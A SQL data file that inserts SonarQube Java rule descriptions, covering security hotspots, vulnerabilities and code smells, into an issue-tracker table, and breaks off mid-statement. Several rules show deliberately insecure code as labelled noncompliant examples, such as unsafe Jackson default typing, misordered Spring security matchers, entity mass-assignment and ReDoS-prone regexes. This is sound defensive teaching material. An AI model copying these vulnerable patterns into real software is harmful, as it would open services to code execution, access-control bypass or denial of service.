INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4531', 'Using setters in Struts 2 ActionSupport is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>Using setters in Struts 2 ActionSupport is security-sensitive. For example, their use has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1006">CVE-2012-1006</a> </li>
</ul>
<p>All classes extending <code>com.opensymphony.xwork2.ActionSupport</code> are potentially remotely reachable. An action class extending
ActionSupport will receive all HTTP parameters sent and these parameters will be automatically mapped to the setters of the Struts 2 action class. One
should review the use of the fields set by the setters, to be sure they are used safely. By default, they should be considered as untrusted
inputs.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the setter is needed. There is no need for it if the attribute''s goal is not to map queries'' parameter. </li>
  <li> the value provided to the setter is properly sanitized before being used or stored. (*) </li>
</ul>
<p>(*) You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>As said in Struts documentation: <a href="https://struts.apache.org/security/#do-not-define-setters-when-not-needed">"Do not define setters when
not needed"</a></p>
<p>Sanitize the user input. This can be for example done by implementing the <code>validate()</code> method of
<code>com.opensymphony.xwork2.ActionSupport</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class AccountBalanceAction extends ActionSupport {
  private static final long serialVersionUID = 1L;
  private Integer accountId;

  // this setter might be called with user input
  public void setAccountId(Integer accountId) {
    this.accountId = accountId;
  }

  @Override
  public String execute() throws Exception {
    // call a service to get the account''s details and its balance
    [...]
    return SUCCESS;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection">OWASP Top 10 2017 Category A1</a> - Injection </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>', 'java', 'DEPRECATED', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4544', 'Using unsafe Jackson deserialization configuration is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>Using unsafe Jackson deserialization configuration is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-4995">CVE-2017-4995</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19362">CVE-2018-19362</a> </li>
</ul>
<p>When Jackson is configured to allow Polymorphic Type Handling (aka PTH), formerly known as Polymorphic Deserialization, "deserialization gadgets"
may allow an attacker to perform remote code execution. </p>
<p>This rule raises an issue when:</p>
<ul>
  <li> <code>enableDefaultTyping()</code> is called on an instance of <code>com.fasterxml.jackson.databind.ObjectMapper</code> or
  <code>org.codehaus.jackson.map.ObjectMapper</code>. </li>
  <li> or when the annotation <code>@JsonTypeInfo</code> is set at class or field levels and configured with <code>use = JsonTypeInfo.Id.CLASS)</code>
  or <code>use = Id.MINIMAL_CLASS</code>. </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> You configured the Jackson deserializer as mentioned above. </li>
  <li> The serialized data might come from an untrusted source. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use the latest patch versions of <code>jackson-databind</code> blocking the already discovered "deserialization gadgets". </li>
  <li> Avoid using the default typing configuration: <code>ObjectMapper.enableDefaultTyping()</code>. </li>
  <li> If possible, use <code>@JsonTypeInfo(use = Id.NAME)</code> instead of <code>@JsonTypeInfo(use = Id.CLASS)</code> or <code>@JsonTypeInfo(use =
  Id. MINIMAL_CLASS)</code> and so rely on <code>@JsonTypeName</code> and <code>@JsonSubTypes</code>. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping(); // Sensitive
</pre>
<pre>
@JsonTypeInfo(use = Id.CLASS) // Sensitive
abstract class PhoneNumber {
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization">OWASP Top 10 2017 Category A8</a> - Insecure Deserialization
  </li>
  <li> OWASP - <a href="https://www.owasp.org/index.php/Deserialization_of_untrusted_data">Deserialization of untrusted data</a> </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/502.html">MITRE, CWE-502</a> - Deserialization of Untrusted Data </li>
  <li> <a href="https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062">On Jackson CVEs: Don’t
  Panic</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-15095">CVE-2017-1509</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-7525">CVE-2017-7525</a> </li>
  <li> Derived from FindSecBugs rule <a
  href="https://find-sec-bugs.github.io/bugs.htm#JACKSON_UNSAFE_DESERIALIZATION">JACKSON_UNSAFE_DESERIALIZATION</a> </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4551', 'Enum values should be compared with "=="', 'sonarqube', 'Code Smell', '<p>Testing equality of an enum value with <code>equals</code> is perfectly valid because an enum is an Object and every Java developer knows "=="
should not be used to compare the content of an Object. At the same time, using "==" on enums:</p>
<ul>
  <li> provides the same expected comparison (content) as <code>equals</code> </li>
  <li> is more null-safe than equals() </li>
  <li> provides compile-time (static) checking rather than runtime checking </li>
</ul>
<p>For these reasons, use of "==" should be preferred to <code>equals</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public enum Fruit {
   APPLE, BANANA, GRAPE
}

public enum Cake {
  LEMON_TART, CHEESE_CAKE
}

public boolean isFruitGrape(Fruit candidateFruit) {
  return candidateFruit.equals(Fruit.GRAPE); // Noncompliant; this will raise an NPE if candidateFruit is NULL
}

public boolean isFruitGrape(Cake candidateFruit) {
  return candidateFruit.equals(Fruit.GRAPE); // Noncompliant; always returns false
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public boolean isFruitGrape(Fruit candidateFruit) {
  return candidateFruit == Fruit.GRAPE; // Compliant; there is only one instance of Fruit.GRAPE - if candidateFruit is a GRAPE it will have the same reference as Fruit.GRAPE
}

public boolean isFruitGrape(Cake candidateFruit) {
  return candidateFruit == Fruit.GRAPE; // Compliant; compilation time failure
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.javaworld.com/article/2074292/core-java/use-----or-----to-compare-java-enums.html">Use == (or !=) to Compare Java
  Enums</a> </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4601', '"HttpSecurity" URL patterns should be correctly ordered', 'sonarqube', 'Vulnerability', '<p>URL patterns configured on a <code>HttpSecurity.authorizeRequests()</code> method are considered in the order they were declared. It''s easy to do a
mistake and to declare a less restrictive configuration before a more restrictive one. Therefore, it''s required to review the order of the
"antMatchers" declarations. The <code>/**</code> one should be the last one if it is declared.</p>
<p>This rule raises an issue when:</p>
<ul>
  <li> A pattern is preceded by another that ends with <code>**</code> and has the same beginning. E.g.: <code>/page*-admin/db/**</code> is after
  <code>/page*-admin/**</code> </li>
  <li> A pattern without wildcard characters is preceded by another that matches. E.g.: <code>/page-index/db</code> is after <code>/page*/**</code>
  </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
  protected void configure(HttpSecurity http) throws Exception {
    http.authorizeRequests()
      .antMatchers("/resources/**", "/signup", "/about").permitAll() // Compliant
      .antMatchers("/admin/**").hasRole("ADMIN")
      .antMatchers("/admin/login").permitAll() // Noncompliant; the pattern "/admin/login" should occurs before "/admin/**"
      .antMatchers("/**", "/home").permitAll()
      .antMatchers("/db/**").access("hasRole(''ADMIN'') and hasRole(''DBA'')") // Noncompliant; the pattern "/db/**" should occurs before "/**"
      .and().formLogin().loginPage("/login").permitAll().and().logout().permitAll();
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
  protected void configure(HttpSecurity http) throws Exception {
    http.authorizeRequests()
      .antMatchers("/resources/**", "/signup", "/about").permitAll() // Compliant
      .antMatchers("/admin/login").permitAll()
      .antMatchers("/admin/**").hasRole("ADMIN") // Compliant
      .antMatchers("/db/**").access("hasRole(''ADMIN'') and hasRole(''DBA'')")
      .antMatchers("/**", "/home").permitAll() // Compliant; "/**" is the last one
      .and().formLogin().loginPage("/login").permitAll().and().logout().permitAll();
  }
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4602', '"@SpringBootApplication" and "@ComponentScan" should not be used in the default package', 'sonarqube', 'Bug', '<p><code>@ComponentScan</code> is used to determine which Spring Beans are available in the application context. The packages to scan can be
configured thanks to the <code>basePackageClasses</code> or <code>basePackages</code> (or its alias <code>value</code>) parameters. If neither
parameter is configured, <code>@ComponentScan</code> will consider only the package of the class annotated with it. When <code>@ComponentScan</code>
is used on a class belonging to the default package, the entire classpath will be scanned.</p>
<p>This will slow-down the start-up of the application and it is likely the application will fail to start with an
<code>BeanDefinitionStoreException</code> because you ended up scanning the Spring Framework package itself.</p>
<p>This rule raises an issue when:</p>
<ul>
  <li> <code>@ComponentScan</code>, <code>@SpringBootApplication</code> and <code>@ServletComponentScan</code> are used on a class belonging to the
  default package </li>
  <li> <code>@ComponentScan</code> is explicitly configured with the default package </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
import org.springframework.boot.SpringApplication;

@SpringBootApplication // Noncompliant; RootBootApp is declared in the default package
public class RootBootApp {
...
}
</pre>
<pre>
@ComponentScan("")
public class Application {
...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
package hello;

import org.springframework.boot.SpringApplication;

@SpringBootApplication // Compliant; RootBootApp belongs to the "hello" package
public class RootBootApp {
...
}
</pre>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4604', '"@EnableAutoConfiguration" should be fine-tuned', 'sonarqube', 'Code Smell', '<p>"@EnableAutoConfiguration" is a convenient feature to configure the Spring Application Context by attempting to guess the beans that you are likely
to need. The drawback is that it may load and configure beans the application will never use and therefore consume more CPU and RAM than really
required. <code>@EnableAutoConfiguration</code> should be configured to exclude all the beans not required by the application. Alternatively, use the
<code>@Import</code> annotation instead of <code>@EnableAutoConfiguration</code>, to explicitly import the useful AutoConfiguration classes.</p>
<p>This rule applies for <code>@SpringBootApplication</code> as well.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@SpringBootApplication
public class MyApplication {
...
}
</pre>
<pre>
@Configuration
@EnableAutoConfiguration
public class MyApplication {
...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@SpringBootApplication(exclude = {
  MultipartAutoConfiguration.class,
  JmxAutoConfiguration.class,
})
public class MyApplication {
...
}
</pre>
<pre>
@Configuration
@EnableAutoConfiguration(exclude = {
  MultipartAutoConfiguration.class,
  JmxAutoConfiguration.class,
})
public class MyApplication {
...
}
</pre>
<pre>
@Configuration
@Import({
        DispatcherServletAutoConfiguration.class,
        EmbeddedServletContainerAutoConfiguration.class,
        ErrorMvcAutoConfiguration.class,
        HttpEncodingAutoConfiguration.class,
        HttpMessageConvertersAutoConfiguration.class,
        JacksonAutoConfiguration.class,
        ServerPropertiesAutoConfiguration.class,
        PropertyPlaceholderAutoConfiguration.class,
        ThymeleafAutoConfiguration.class,
        WebMvcAutoConfiguration.class
})
public class MyApplication {
...
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4605', 'Spring beans should be considered by "@ComponentScan"', 'sonarqube', 'Code Smell', '<p>Spring beans belonging to packages that are not included in a <code>@ComponentScan</code> configuration will not be accessible in the Spring
Application Context. Therefore, it''s likely to be a configuration mistake that will be detected by this rule. </p>
<p><strong>Note:</strong> the <code>@ComponentScan</code> is implicit in the <code>@SpringBootApplication</code> annotation, case in which Spring Boot
will auto scan for components in the package containing the Spring Boot main class and its sub-packages.</p>
<h2>Noncompliant Code Example</h2>
<pre>
package com.mycompany.app;

@Configuration
@ComponentScan("com.mycompany.app.beans")
public class Application {
...
}

package com.mycompany.app.web;

@Controller
public class MyController { // Noncompliant; MyController belong to "com.mycompany.app.web" while the ComponentScan is looking for beans in "com.mycompany.app.beans" package
...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
package com.mycompany.app;

@Configuration
@ComponentScan({"com.mycompany.app.beans","com.mycompany.app.web"})
or
@ComponentScan("com.mycompany.app")
or
@ComponentScan
public class Application {
...
}

package com.mycompany.app.web;

@Controller
public class MyController { // "com.mycompany.app.web" is referenced by a @ComponentScan annotated class
...
}
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4635', 'String offset-based methods should be preferred for finding substrings from offsets', 'sonarqube', 'Code Smell', '<p>Looking for a given substring starting from a specified offset can be achieved by such code: <code>str.substring(beginIndex).indexOf(char1)</code>.
This works well, but it creates a new <code>String</code> for each call to the <code>substring</code> method. When this is done in a loop, a lot of
<code>Strings</code> are created for nothing, which can lead to performance problems if <code>str</code> is large.</p>
<p>To avoid performance problems, <code>String.substring(beginIndex)</code> should not be chained with the following methods:</p>
<ul>
  <li> <code>indexOf(int ch)</code> </li>
  <li> <code>indexOf(String str)</code> </li>
  <li> <code>lastIndexOf(int ch)</code> </li>
  <li> <code>lastIndexOf(String str)</code> </li>
  <li> <code>startsWith(String prefix)</code> </li>
</ul>
<p>For each of these methods, another method with an additional parameter is available to specify an offset.</p>
<p>Using these methods gives the same result while avoiding the creation of additional <code>String</code> instances.</p>
<h2>Noncompliant Code Example</h2>
<pre>
str.substring(beginIndex).indexOf(char1); // Noncompliant; a new String is going to be created by "substring"
</pre>
<h2>Compliant Solution</h2>
<pre>
str.indexOf(char1, beginIndex);
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4682', '"@CheckForNull" or "@Nullable" should not be used on primitive types', 'sonarqube', 'Code Smell', '<p>By definition, primitive types are not Objects and so they can''t be <code>null</code>. Adding <code>@CheckForNull</code> or <code>@Nullable</code>
on primitive types adds confusion and is useless.</p>
<p>This rule raises an issue when <code>@CheckForNull</code> or <code>@Nullable</code> is set on a method returning a primitive type: byte, short,
int, long, float, double, boolean, char.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@CheckForNull
boolean isFoo() {
 ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
boolean isFoo() {
 ...
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4684', 'Persistent entities should not be used as arguments of "@RequestMapping" methods', 'sonarqube', 'Vulnerability', '<p>On one side, Spring MVC automatically bind request parameters to beans declared as arguments of methods annotated with
<code>@RequestMapping</code>. Because of this automatic binding feature, it''s possible to feed some unexpected fields on the arguments of the
<code>@RequestMapping</code> annotated methods. </p>
<p>On the other end, persistent objects (<code>@Entity</code> or <code>@Document</code>) are linked to the underlying database and updated
automatically by a persistence framework, such as Hibernate, JPA or Spring Data MongoDB.</p>
<p>These two facts combined together can lead to malicious attack: if a persistent object is used as an argument of a method annotated with
<code>@RequestMapping</code>, it''s possible from a specially crafted user input, to change the content of unexpected fields into the database.</p>
<p>For this reason, using <code>@Entity</code> or <code>@Document</code> objects as arguments of methods annotated with <code>@RequestMapping</code>
should be avoided.</p>
<p>In addition to <code>@RequestMapping</code>, this rule also considers the annotations introduced in Spring Framework 4.3: <code>@GetMapping</code>,
<code>@PostMapping</code>, <code>@PutMapping</code>, <code>@DeleteMapping</code>, <code>@PatchMapping</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
import javax.persistence.Entity;

@Entity
public class Wish {
  Long productId;
  Long quantity;
  Client client;
}

@Entity
public class Client {
  String clientId;
  String name;
  String password;
}

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

@Controller
public class WishListController {

  @PostMapping(path = "/saveForLater")
  public String saveForLater(Wish wish) {
    session.save(wish);
  }

  @RequestMapping(path = "/saveForLater", method = RequestMethod.POST)
  public String saveForLater(Wish wish) {
    session.save(wish);
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class WishDTO {
  Long productId;
  Long quantity;
  Long clientId;
}

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

@Controller
public class PurchaseOrderController {

  @PostMapping(path = "/saveForLater")
  public String saveForLater(WishDTO wish) {
    Wish persistentWish = new Wish();
    // do the mapping between "wish" and "persistentWish"
    [...]
    session.save(persistentWish);
  }

  @RequestMapping(path = "/saveForLater", method = RequestMethod.POST)
  public String saveForLater(WishDTO wish) {
    Wish persistentWish = new Wish();
    // do the mapping between "wish" and "persistentWish"
    [...]
    session.save(persistentWish);
  }
}
</pre>
<h2>Exceptions</h2>
<p>No issue is reported when the parameter is annotated with <code>@PathVariable</code> from Spring Framework, since the lookup will be done via id,
the object cannot be forged on client side.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/915.html">MITRE, CWE-915</a> - Improperly Controlled Modification of Dynamically-Determined
  Object Attributes </li>
  <li> <a href="https://o2platform.files.wordpress.com/2011/07/ounce_springframework_vulnerabilities.pdf">Two Security Vulnerabilities in the Spring
  Framework’s MVC by Ryan Berg and Dinis Cruz</a> </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4719', '"StandardCharsets" constants should be preferred', 'sonarqube', 'Code Smell', '<p>JDK7 introduced the class <code>java.nio.charset.StandardCharsets</code>. It provides constants for all charsets that are guaranteed to be
available on every implementation of the Java platform.</p>
<ul>
  <li> ISO_8859_1 </li>
  <li> US_ASCII </li>
  <li> UTF_16 </li>
  <li> UTF_16BE </li>
  <li> UTF_16LE </li>
  <li> UTF_8 </li>
</ul>
<p>These constants should be preferred to:</p>
<ul>
  <li> the use of a String such as "UTF-8" which has the drawback of requiring the <code>catch</code>/<code>throw</code> of an
  <code>UnsupportedEncodingException</code> that will never actually happen </li>
  <li> the use of Guava’s <code>Charsets</code> class, which has been obsolete since JDK7 </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
try {
  byte[] bytes = string.getBytes("UTF-8"); // Noncompliant; use a String instead of StandardCharsets.UTF_8
} catch (UnsupportedEncodingException e) {
  throw new AssertionError(e);
}
// ...
byte[] bytes = string.getBytes(Charsets.UTF_8); // Noncompliant; Guava way obsolete since JDK7
</pre>
<h2>Compliant Solution</h2>
<pre>
byte[] bytes = string.getBytes(StandardCharsets.UTF_8)
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4738', 'Java features should be preferred to Guava', 'sonarqube', 'Code Smell', '<p>Some Guava features were really useful for Java 7 application because Guava was bringing APIs missing in the JDK. Java 8 fixed some of these
limitations. When migrating an application to Java 8 or even when starting a new one, it''s recommended to prefer Java 8 APIs over Guava ones to ease
its maintenance: developers don''t need to learn how to use two APIs and can stick to the standard one.</p>
<p>Java 9 brought even more useful methods to the standard Java library and if Java version is equal to or higher than 9, these standard methods
should be used.</p>
<p>This rule raises an issue when the following Guava APIs are used:</p>
<table>
  <tbody>
    <tr>
      <th> Guava API </th>
      <th> Java 8 API </th>
    </tr>
    <tr>
      <td> com.google.common.io.BaseEncoding#base64() </td>
      <td> java.util.Base64 </td>
    </tr>
    <tr>
      <td> com.google.common.io.BaseEncoding#base64Url() </td>
      <td> java.util.Base64 </td>
    </tr>
    <tr>
      <td> com.google.common.base.Joiner.on() </td>
      <td> java.lang.String#join() or java.util.stream.Collectors#joining() </td>
    </tr>
    <tr>
      <td> com.google.common.base.Optional#of() </td>
      <td> java.util.Optional#of() </td>
    </tr>
    <tr>
      <td> com.google.common.base.Optional#absent() </td>
      <td> java.util.Optional#empty() </td>
    </tr>
    <tr>
      <td> com.google.common.base.Optional#fromNullable() </td>
      <td> java.util.Optional#ofNullable() </td>
    </tr>
    <tr>
      <td> com.google.common.base.Optional </td>
      <td> java.util.Optional </td>
    </tr>
    <tr>
      <td> com.google.common.base.Predicate </td>
      <td> java.util.function.Predicate </td>
    </tr>
    <tr>
      <td> com.google.common.base.Function </td>
      <td> java.util.function.Function </td>
    </tr>
    <tr>
      <td> com.google.common.base.Supplier </td>
      <td> java.util.function.Supplier </td>
    </tr>
    <tr>
      <td> com.google.common.io.Files.createTempDir </td>
      <td> java.nio.file.Files.createTempDirectory </td>
    </tr>
    <tr>
      <th> Guava API </th>
      <th> Java 9 API </th>
    </tr>
    <tr>
      <td> com.google.common.collect.ImmutableSet#of() </td>
      <td> java.util.Set#of() </td>
    </tr>
    <tr>
      <td> com.google.common.collect.ImmutableList#of() </td>
      <td> java.util.List#of() </td>
    </tr>
    <tr>
      <td> com.google.common.collect.ImmutableMap#of() </td>
      <td> java.util.Map#of() or java.util.Map#ofEntries()</td>
    </tr>
  </tbody>
</table>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4784', 'Using regular expressions is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>Using regular expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16021">CVE-2017-16021</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13863">CVE-2018-13863</a> </li>
</ul>
<p>Evaluating regular expressions against input strings is potentially an extremely CPU-intensive task. Specially crafted regular expressions such as
<code>(a+)+s</code> will take several seconds to evaluate the input string <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaabs</code>. The problem is that with
every additional <code>a</code> character added to the input, the time required to evaluate the regex doubles. However, the equivalent regular
expression, <code>a+s</code> (without grouping) is efficiently evaluated in milliseconds and scales linearly with the input size.</p>
<p>Evaluating such regular expressions opens the door to <a
href="https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS">Regular expression Denial of Service (ReDoS)</a> attacks. In the
context of a web application, attackers can force the web server to spend all of its resources evaluating regular expressions thereby making the
service inaccessible to genuine users.</p>
<p>This rule flags any execution of a hardcoded regular expression which has at least 3 characters and at least two instances of any of the following
characters: <code>*+{</code>.</p>
<p>Example: <code>(a+)*</code></p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed regular expression is sensitive and a user can provide a string which will be analyzed by this regular expression. </li>
  <li> your regular expression engine performance decrease with specially crafted inputs and regular expressions. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Check whether your regular expression engine (the algorithm executing your regular expression) has any known vulnerabilities. Search for
vulnerability reports mentioning the one engine you''re are using.</p>
<p>Use if possible a library which is not vulnerable to Redos Attacks such as <a href="https://github.com/google/re2">Google Re2</a>.</p>
<p>Remember also that a ReDos attack is possible if a user-provided regular expression is executed. This rule won''t detect this kind of injection.</p>
<h2>Sensitive Code Example</h2>
<pre>
import java.util.regex.Pattern;

class BasePattern {
  String regex = "(a+)+b"; // a regular expression
  String input; // a user input

  void foo(CharSequence htmlString) {
    input.matches(regex);  // Sensitive
    Pattern.compile(regex);  // Sensitive
    Pattern.compile(regex, Pattern.CASE_INSENSITIVE);  // Sensitive

    String replacement = "test";
    input.replaceAll(regex, replacement);  // Sensitive
    input.replaceFirst(regex, replacement);  // Sensitive

    if (!Pattern.matches(".*&lt;script&gt;(a+)+b", htmlString)) { // Sensitive
    }
  }
}
</pre>
<p>This also applies for bean validation, where regexp can be specified:</p>
<pre>
import java.io.Serializable;
import javax.validation.constraints.Pattern;
import javax.validation.constraints.Email;
import org.hibernate.validator.constraints.URL;

class BeansRegex implements Serializable {
  @Pattern(regexp=".+@(a+)+b")  // Sensitive
  private String email;

  @Email(regexp=".+@(a+)+b")  // Sensitive
  private String email2;

  @URL(regexp="(a+)+b.com") // Sensitive
  private String url;
  // ...
}
</pre>
<h2>Exceptions</h2>
<p>Calls to <code>String.split(regex)</code> and <code>String.split(regex, limit)</code> will not raise an exception despite their use of a regular
expression. These methods are used most of the time to split on simple regular expressions which don''t create any vulnerabilities.</p>
<p>Some corner-case regular expressions will not raise an issue even though they might be vulnerable. For example: <code>(a|aa)+</code>,
<code>(a|a?)+</code>.</p>
<p>It is a good idea to test your regular expression if it has the same pattern on both side of a "<code>|</code>".</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection">OWASP Top 10 2017 Category A1</a> - Injection </li>
  <li> <a href="https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS">MITRE, CWE-624</a> - Executable Regular Expression Error
  </li>
  <li> OWASP Regular expression Denial of Service - ReDoS </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href=''/coding_rules#rule_key=java%3AS5852''>S5852</a>, <a href=''/coding_rules#rule_key=javasecurity%3AS2631''>S2631</a> instead.</p>', 'java', 'DEPRECATED', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S4787', 'Encrypting data is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>Encrypting data is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7902">CVE-2017-7902</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-1378">CVE-2006-1378</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1376">CVE-2003-1376</a> </li>
</ul>
<p>Proper encryption requires both the encryption algorithm and the key to be strong. Obviously the private key needs to remain secret and be renewed
regularly. However these are not the only means to defeat or weaken an encryption.</p>
<p>This rule flags function calls that initiate encryption/decryption.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the private key might not be random, strong enough or the same key is reused for a long long time. </li>
  <li> the private key might be compromised. It can happen when it is stored in an unsafe place or when it was transferred in an unsafe manner. </li>
  <li> the key exchange is made without properly authenticating the receiver. </li>
  <li> the encryption algorithm is not strong enough for the level of protection required. Note that encryption algorithms strength decreases as time
  passes. </li>
  <li> the chosen encryption library is deemed unsafe. </li>
  <li> a nonce is used, and the same value is reused multiple times, or the nonce is not random. </li>
  <li> the RSA algorithm is used, and it does not incorporate an Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption.
  </li>
  <li> the CBC (Cypher Block Chaining) algorithm is used for encryption, and it''s IV (Initialization Vector) is not generated using a secure random
  algorithm, or it is reused. </li>
  <li> the Advanced Encryption Standard (AES) encryption algorithm is used with an unsecure mode. See the recommended practices for more information.
  </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Generate encryption keys using secure random algorithms. </li>
  <li> When generating cryptographic keys (or key pairs), it is important to use a key length that provides enough entropy against brute-force
  attacks. For the Blowfish algorithm the key should be at least 128 bits long, while for the RSA algorithm it should be at least 2048 bits long.
  </li>
  <li> Regenerate the keys regularly. </li>
  <li> Always store the keys in a safe location and transfer them only over safe channels. </li>
  <li> If there is an exchange of cryptographic keys, check first the identity of the receiver. </li>
  <li> Only use strong encryption algorithms. Check regularly that the algorithm is still deemed secure. It is also imperative that they are
  implemented correctly. Use only encryption libraries which are deemed secure. Do not define your own encryption algorithms as they will most
  probably have flaws. </li>
  <li> When a nonce is used, generate it randomly every time. </li>
  <li> When using the RSA algorithm, incorporate an Optimal Asymmetric Encryption Padding (OAEP). </li>
  <li> When CBC is used for encryption, the IV must be random and unpredictable. Otherwise it exposes the encrypted value to crypto-analysis attacks
  like "Chosen-Plaintext Attacks". Thus a secure random algorithm should be used. An IV value should be associated to one and only one encryption
  cycle, because the IV''s purpose is to ensure that the same plaintext encrypted twice will yield two different ciphertexts. </li>
  <li> The Advanced Encryption Standard (AES) encryption algorithm can be used with various modes. Galois/Counter Mode (GCM) with no padding should be
  preferred to the following combinations which are not secured:
    <ul>
      <li> Electronic Codebook (ECB) mode: Under a given key, any given plaintext block always gets encrypted to the same ciphertext block. Thus, it
      does not hide data patterns well. In some senses, it doesn''t provide serious message confidentiality, and it is not recommended for use in
      cryptographic protocols at all. </li>
      <li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is susceptible to padding oracle attacks. </li>
    </ul> </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
// === javax.crypto ===
import javax.crypto.Cipher;
Cipher c = Cipher.getInstance(...);  // Sensitive

// === apache.commons.crypto ===
